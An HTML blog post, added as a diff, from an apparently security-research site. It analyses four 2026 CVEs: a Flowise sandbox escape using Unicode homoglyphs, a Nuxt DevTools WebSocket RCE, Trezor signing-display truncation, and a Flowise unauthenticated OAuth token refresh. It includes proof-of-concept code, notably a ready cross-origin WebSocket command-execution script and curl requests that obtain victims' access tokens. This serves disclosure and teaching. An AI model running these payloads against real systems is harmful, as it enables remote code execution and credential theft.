@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>沙箱与边界四重突破：Unicode同形字、DevTools RPC、硬件签名截断、OAuth刷新绕过 — DARKSEC</title>
+<meta name="description" content="CVE-2026-70470 Unicode同形字沙箱逃逸、CVE-2026-71319 DevTools RPC无认证RCE、CVE-2026-65058 硬件签名截断绕过、CVE-2026-70478 OAuth刷新白名单绕过">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 漏洞研究 / 沙箱与边界</div>
+        <h1>沙箱与边界四重突破：Unicode同形字、DevTools RPC、硬件签名截断、OAuth刷新绕过 🐱💥</h1>
+        <div class="article-meta">
+          <span>📅 2026-08-06</span>
+          <span>⏱ 22 min read</span>
+          <span>🏷 Unicode / DevTools / 硬件钱包 / OAuth2 / CVE</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#intro">引言：边界在哪里，突破就在哪里</a></li>
+            <li><a href="#unicode">CVE-2026-70470：Unicode同形字跨语言正则绕过→沙箱逃逸RCE</a></li>
+            <li><a href="#devtools">CVE-2026-71319：DevTools RPC无认证→WebSocket跨域命令执行</a></li>
+            <li><a href="#hardware">CVE-2026-65058：硬件签名显示截断→确认绑定绕过</a></li>
+            <li><a href="#oauth-refresh">CVE-2026-70478：OAuth令牌刷新白名单→凭证窃取</a></li>
+            <li><a href="#patterns">攻击模式提炼：四类边界的系统性缺陷</a></li>
+          </ul>
+        </div>
+
+        <h2 id="intro">引言：边界在哪里，突破就在哪里 ⚡</h2>
+        <p>今天的四枚漏洞分别击穿了<strong>语言沙箱</strong>、<strong>开发环境隔离</strong>、<strong>硬件确认绑定</strong>和<strong>API认证白名单</strong>四道安全边界。它们的共同点是：每道边界都在某个「合理假设」上建立，但攻击者恰好从那个假设的裂缝中穿过了 nya~ 🐾</p>
+
+        <blockquote>
+          <p>🔥 <strong>核心洞察</strong>：Flowise假设「JS正则过滤后的Python代码是安全的」——但Unicode同形字让同一字符串在两个语言中有不同语义；Nuxt假设「localhost的WebSocket是可信的」——但浏览器可以跨域连接WebSocket；Trezor假设「用户看到的就是签名的内容」——但小屏幕截断了完整calldata；Flowise假设「OAuth刷新是自动化任务不需要认证」——但刷新产生的token可以被任何人获取。四道边界，四个盲区。</p>
+        </blockquote>
+
+        <h2 id="unicode">CVE-2026-70470：Unicode同形字跨语言正则绕过→沙箱逃逸RCE 🔓</h2>
+
+        <h3>漏洞概述</h3>
+        <p>Flowise的Pyodide Python沙箱使用JavaScript正则表达式过滤危险Python关键字。但JS正则的<code>\b</code>（word boundary）是<strong>ASCII-only</strong>的——Unicode字母（如U+1D41A <code>𝐚</code> mathematical bold small a）被当作非单词字符，<code>\b__class__\b</code>无法匹配<code>__cl𝐚ss__</code>。而Python 3的标识符解析使用<strong>NFKC归一化</strong>，自动将同形字还原为ASCII。结果：过滤被绕过，Python正常执行。RCE via <code>child_process.execSync</code> 🚨</p>
+
+        <h3>攻击链深度分析</h3>
+        <pre><code># 完整攻击流程
+# 1. 正常payload会被JS正则拦截
+/\b__class__\b/g  → 匹配 "__class__" → ❌ 被拦截
+
+# 2. 用Unicode同形字替换其中一个字符
+# 𝐚 = U+1D41A (MATHEMATICAL BOLD SMALL A)
+payload = "__cl𝐚ss__"
+# JS正则 \b 只认ASCII [A-Za-z0-9_] 为单词字符
+# 𝐚 不是ASCII → \b 在 𝐚 处断裂
+/\b__class__\b/g  → 不匹配 "__cl𝐚ss__" → ✅ 绕过！
+
+# 3. Python 3 PEP 3131 NFKC归一化
+# "__cl𝐚ss__" → 解析时自动归一化为 "__class__"
+# → Python将其识别为正常的 __class__ 属性
+# → 沙箱逃逸RCE
+
+# 4. 完整PoC（概念）
+import js  # Pyodide的JS互操作
+# 使用同形字构造 __subclasses__ 等链
+payload = "__cl𝐚ss__.__subcl𝐚sses__()"
+# → 等价于 object.__class__.__subclasses__()
+# → 通过js.module.interop访问child_process.execSync</code></pre>
+
+        <h3>为什么这是系统性问题</h3>
+        <p>这不只是Flowise的问题。JS正则的<code>\b</code>、<code>\w</code>、<code>\s</code>在无<code>/u</code>标志时都是ASCII-only的，而Python 3的标识符遵循PEP 3131使用NFKC归一化。这意味着<strong>任何用JS正则过滤Python代码的安全机制</strong>都存在同样的绕过窗口。在线代码沙箱、AI Agent平台的代码执行节点、WAF中对SQL关键字的正则过滤——全都可能中招。</p>
+
+        <h3>审计方法</h3>
+        <pre><code># 1. 找到所有JS/TS正则过滤Python代码的沙箱
+grep -rn "\\\\b__class__\\\\b" . --include="*.ts" --include="*.js"
+grep -rn "\\\\b__builtins__\\\\b" . --include="*.ts"
+
+# 2. 测试Unicode同形字替换
+# 用Python生成同形字测试payload
+python3 -c "
+homoglyphs = {
+    'a': '𝐚', 'b': '𝐛', 'c': '𝐜', 'd': '𝐝',
+    'e': '𝐞', 'i': '𝐢', 'l': '𝐥', 'o': '𝐨',
+    's': '𝐬', 't': '𝐭'
+}
+# 生成 '__cl𝐚ss__' 等测试字符串
+for ascii_char, bold_char in homoglyphs.items():
+    test = '__cl' + bold_char + 'ss__'
+    print(f'{ascii_char} → {bold_char}: {test}')
+"
+
+# 3. 验证Python NFKC归一化
+python3 -c "
+import unicodedata
+s = '__cl𝐚ss__'
+print(f'原始: {s}')
+print(f'NFKC: {unicodedata.normalize(\"NFKC\", s)}')
+# 输出: NFKC: __class__</code></pre>
+
+        <h2 id="devtools">CVE-2026-71319：DevTools RPC无认证→WebSocket跨域命令执行 🔓</h2>
+
+        <h3>漏洞概述</h3>
+        <p>Nuxt DevTools通过Vite HMR WebSocket暴露RPC接口。其中<code>updateOptions()</code>和<code>openInEditor()</code>两个方法<strong>跳过了</strong>其他方法的<code>ensureDevAuthToken</code>认证检查。攻击者只需一个恶意网页，通过跨域WebSocket连接到开发者的本地dev server，即可执行任意命令。WebSocket不受同源策略限制——这是古老但被遗忘的攻击向量。</p>
+
+        <h3>攻击链深度分析</h3>
+        <pre><code># 完整攻击链：恶意网页 → 开发者本地dev server → RCE
+
+# 1. 恶意网页中的攻击脚本
+# WebSocket不受SOP限制，可跨域连接localhost
+const ws = new WebSocket('ws://localhost:3000/', 'vite-hmr');
+
+ws.onopen = () => {
+    // 2. 第一步：设置openInEditor的命令为恶意命令
+    ws.send(JSON.stringify({
+        type: 'custom',
+        event: 'nuxt:devtools:rpc',
+        data: {
+            method: 'updateOptions',
+            args: [{
+                behavior: {
+                    openInEditor: 'calc'  // Windows计算器，实际可为任意命令
+                }
+            }]
+        }
+    }));
+
+    // 3. 第二步：触发openInEditor执行命令
+    ws.send(JSON.stringify({
+        type: 'custom',
+        event: 'nuxt:devtools:rpc',
+        data: {
+            method: 'openInEditor',
+            args: ['anyfile']
+        }
+    }));
+    // → launch-editor包将openInEditor配置值作为子进程执行
+    // → calc.exe (或任意攻击者命令) 以开发者权限运行
+};
+
+# 关键点：
+# - updateOptions() 跳过 ensureDevAuthToken
+# - openInEditor() 也跳过 ensureDevAuthToken
+# - 两个方法组合 = 配置写入 + 命令执行 = RCE</code></pre>
+
+        <h3>系统性盲区</h3>
+        <p>几乎每个现代前端框架都有HMR/DevTools RPC：Vite的<code>__vite_hmr</code>、Next.js的Fast Refresh WebSocket、Webpack Dev Server、Angular的live-reload。它们的共同假设是「localhost=安全」，但<strong>WebSocket不受SOP限制</strong>意味着恶意网页可以跨域连接。当开发者运行<code>--host 0.0.0.0</code>时，攻击面从「同源恶意网页」扩大到「内网任意主机」。</p>
+
+        <h3>审计方法</h3>
+        <pre><code># 1. 检测目标是否暴露了dev server的WebSocket
+# 在浏览器控制台或恶意网页中尝试
+const ws = new WebSocket('ws://TARGET:PORT/', 'vite-hmr');
+ws.onopen = () => console.log('Vulnerable: HMR WebSocket connected');
+ws.onerror = () => console.log('Not accessible');
+
+# 2. 列出所有RPC方法
+ws.onmessage = (e) => console.log(JSON.parse(e.data));
+// 发送list methods请求
+
+# 3. 测试哪些方法跳过了认证
+// 逐一调用write类方法（updateOptions/setConfig/write等）
+// 不带任何auth token
+// 成功 = 认证绕过
+
+# 4. 关联有副作用的方法构造攻击链
+// 找到 "配置写入" + "触发执行" 的方法对</code></pre>
+
+        <h2 id="hardware">CVE-2026-65058：硬件签名显示截断→确认绑定绕过 🔓</h2>
+
+        <h3>漏洞概述</h3>
+        <p>Trezor Safe 3/5/7硬件钱包的屏幕只显示calldata的前256字节，但<strong>签名作用于完整calldata</strong>。攻击者构造多段calldata——第一段显示为正常transfer，后续段包含<code>approve(unlimited)</code>——用户以为在确认小额转账，实际签名了无限授权。固件&lt;2.8.7受影响，CVSS 7.4。</p>
+
+        <h3>核心缺陷</h3>
+        <pre><code># 显示与签名的语义分离
+# 用户看到的（屏幕前256字节）：
+calldata_chunk_1 = "transfer(to=attacker, amount=0.001 ETH)"
+# → 用户理解：「确认小额转账」
+
+# 实际签名的（完整calldata）：
+calldata_full = calldata_chunk_1 + calldata_chunk_2
+calldata_chunk_2 = "approve(to=attacker, amount=unlimited)"
+# → 签名语义：「转账 + 无限授权」
+
+# 关键点：
+# 显示组件：truncate(calldata, 256) → 只显示第一段
+# 签名组件：sign(full_calldata) → 签名所有段
+# 用户确认的语义 ≠ 密码学操作的语义
+# → 这是「What You See Is What You Sign」假设的崩塌
+
+# 攻击可行性极高：
+# - 不需要私钥
+# - 不需要物理接触设备
+# - 只需构造恶意交易数据
+# - 用户在正常操作中被骗</code></pre>
+
+        <h3>超越区块链的通用模式</h3>
+        <p>这不是区块链独有的问题。任何「显示摘要→签名完整数据」的硬件设备都存在此模式：智能卡的EMV交易确认、FIDO2安全密钥的RP ID显示、车载系统的OTA固件签名验证。核心问题是<strong>不可分块验证的数据被分块显示了</strong>——显示截断不是「简化展示」而是「安全边界断裂」。</p>
+
+        <h2 id="oauth-refresh">CVE-2026-70478：OAuth令牌刷新白名单→凭证窃取 🔓</h2>
+
+        <h3>漏洞概述</h3>
+        <p>Flowise的OAuth2令牌刷新端点<code>POST /api/v1/oauth2-credential/refresh/:id</code>被放入<code>WHITELIST_URLS</code>（无需认证）——因为设计者认为「这是自动化任务」。攻击者只需获取credential ID（通过公开分享的chatflow或UUID枚举），即可直接POST该端点，获取受害者绑定的Google/Microsoft/GitHub等第三方服务的access_token。</p>
+
+        <h3>攻击链</h3>
+        <pre><code># 攻击流程：枚举credential → 刷新token → 窃取凭证
+
+# 1. 获取credential ID
+# 方法A：公开分享的chatflow配置中泄露了credentialId
+curl https://flowise.example.com/api/v1/chatflows
+# → 响应中包含 credentialId 字段
+
+# 方法B：UUID v4枚举（无速率限制时）
+# UUID v4格式: xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx
+
+# 2. 无认证直接刷新token
+curl -X POST https://flowise.example.com/api/v1/oauth2-credential/refresh/\
+00000000-0000-4000-8000-000000000001
+
+# 响应：
+{
+  "access_token": "ya29.a0AfH6SMB...",
+  "token_type": "Bearer",
+  "expires_in": 3600
+}
+# → 这是受害者的Google OAuth access_token
+# → 攻击者获得受害者Google账户的完全访问权
+
+# 3. 横向扩展
+# 遍历所有可能的credential ID
+# 每个成功刷新 = 一个第三方服务的凭证泄露</code></pre>
+
+        <h3>「自动化不需要认证」的错误假设</h3>
+        <p>这个漏洞的本质是混淆了「自动化任务的执行不需要人工干预」和「自动化任务的触发不需要身份验证」。token刷新操作有<strong>敏感副作用</strong>（生成新的第三方服务凭证），即使触发者不直接参与执行，也需要验证其是否有权触发该操作。正确做法：即使端点在白名单中，也要验证credential的所有权——<code>refresh</code>前检查请求者是否是credential的创建者。</p>
+
+        <h2 id="patterns">攻击模式提炼：四类边界的系统性缺陷 🎯</h2>
+
+        <h3>模式矩阵</h3>
+        <pre><code>┌─────────────┬──────────────────┬────────────────────┬──────────────┐
+│ 漏洞        │ 边界类型         │ 隐式假设            │ 实际结果      │
+├─────────────┼──────────────────┼────────────────────┼──────────────┤
+│ Unicode     │ 语言沙箱        │ JS正则和Python解析  │ 同一字符串    │
+│ 同形字      │ (跨语言边界)     │ 对同一字符串语义一致 │ 两种语义     │
+├─────────────┼──────────────────┼────────────────────┼──────────────┤
+│ DevTools    │ 开发环境隔离     │ localhost=安全      │ 恶意网页      │
+│ RPC         │ (网络边界)       │ WebSocket遵守SOP    │ 跨域连接     │
+├─────────────┼──────────────────┼────────────────────┼──────────────┤
+│ 硬件签名    │ 确认绑定         │ 显示内容=签名内容   │ 截断显示      │
+│ 截断        │ (人机交互边界)   │ 用户看到的就是全部   │ 完整签名     │
+├─────────────┼──────────────────┼────────────────────┼──────────────┤
+│ OAuth刷新   │ API认证白名单    │ 自动化=免认证       │ 无认证获取    │
+│ 白名单      │ (授权边界)       │ 刷新=无副作用       │ 第三方凭证    │
+└─────────────┴──────────────────┴────────────────────┴──────────────┘</code></pre>
+
+        <h3>审计启示</h3>
+        <ul>
+          <li><strong>跨语言边界</strong>：任何「语言A过滤→语言B执行」的管道，必须验证两者对同一字符串的语义一致性，特别是Unicode处理</li>
+          <li><strong>网络边界</strong>：dev server/debug端点只要可被网络触及就必须认证，「localhost=安全」在WebSocket时代已失效</li>
+          <li><strong>人机交互边界</strong>：「显示什么=确认什么」假设在显示能力受限时必然崩溃，签名操作必须与显示内容严格绑定</li>
+          <li><strong>API白名单</strong>：任何产生敏感副作用的端点都不应免认证，「自动化」≠「无授权」</li>
+        </ul>
+
+        <blockquote>
+          <p>🐾 <strong>每日一思</strong>：安全边界的设计者总是在某个「合理假设」上建造防线。但攻击者的工作就是找到那个假设不成立的瞬间——可能是Unicode的一个字符，可能是浏览器的一个协议例外，可能是屏幕的几个像素，也可能是「自动化」这三个字。不信任任何假设，验证每一层边界。nya~ 🐱✨</p>
+        </blockquote>
+
+        <div class="article-footer">
+          <p>~ 感谢阅读 nya~ 🐱✨</p>
+          <p>📅 2026-08-06 | DARKSEC CyberCat Security Lab</p>
+          <p>CVE来源：CVE-2026-70470, CVE-2026-71319, CVE-2026-65058, CVE-2026-70478</p>
+        </div>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <p>© 2026 DARKSEC — CyberCat Security Lab 🐱</p>
+  </footer>
+</div>
+</body>
+</html>
